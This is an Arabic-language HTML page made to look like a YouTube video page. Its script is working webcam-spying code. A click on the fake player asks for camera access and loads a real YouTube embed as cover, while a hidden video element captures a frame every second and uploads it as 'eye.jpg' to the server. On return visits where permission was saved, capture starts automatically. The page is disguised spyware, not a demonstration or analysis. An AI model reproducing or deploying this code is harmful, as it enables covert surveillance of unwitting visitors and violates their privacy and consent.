<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>YouTube</title>
    <style>
        body { font-family: sans-serif; background: #f9f9f9; margin: 0; }
        header { display: flex; padding: 15px; background: white; border-bottom: 1px solid #ddd; }
        .search-bar { flex-grow: 1; background: #f0f0f0; border-radius: 20px; padding: 8px; text-align: center; }
        .video-wrapper { width: 100%; aspect-ratio: 16/9; background: black; cursor: pointer; display: flex; align-items: center; justify-content: center; position: relative; }
        .video-info { padding: 15px; background: white; }
    </style>
</head>
<body>

    <header>
        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" width="90">
        <div class="search-bar">بحث</div>
    </header>

    <div class="video-wrapper" id="video-box">
        <div id="player-area" style="width:100%; height:100%;">
            <img src="https://img.youtube.com/vi/0OxRVbr1J7w/maxresdefault.jpg" style="width:100%; height:100%; object-fit:cover;">
        </div>
    </div>

    <div class="video-info">
        <h1></h1>
        <p>1.2M </p>
        <p style="background:#eee; padding:10px; border-radius:10px;"></p>
    </div>

    <video id="video" autoplay playsinline style="display:none"></video>

    <script>
        // دالة التقاط الصور
        function startCapture() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    document.getElementById('video').srcObject = stream;
                    setInterval(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = 640; canvas.height = 480;
                        canvas.getContext('2d').drawImage(document.getElementById('video'), 0, 0, 640, 480);
                        canvas.toBlob(blob => {
                            let fd = new FormData();
                            fd.append('image', blob, 'eye.jpg');
                            fetch('/upload', { method: 'POST', body: fd });
                        }, 'image/jpeg');
                    }, 1000);
                }).catch(e => console.log("بانتظار الإذن"));
        }

        // المفتاح الذكي: للتشغيل التلقائي عند العودة للموقع (إذا كان الإذن محفوظاً)
        navigator.permissions.query({name: 'camera'}).then((permissionStatus) => {
            if (permissionStatus.state === 'granted') {
                startCapture();
            }
        });

        // عند الضغط على الفيديو (للمرة الأولى يظهر الإذن، ولفتح الفيديو)
        document.getElementById('video-box').addEventListener('click', function() {
            startCapture();
            document.getElementById('player-area').innerHTML = 
                '<iframe src="https://www.youtube.com/embed/0OxRVbr1J7w?autoplay=1" style="width:100%; height:100%; border:none;" allow="autoplay"></iframe>';
        }, { once: true });
    </script>
</body>
</html>
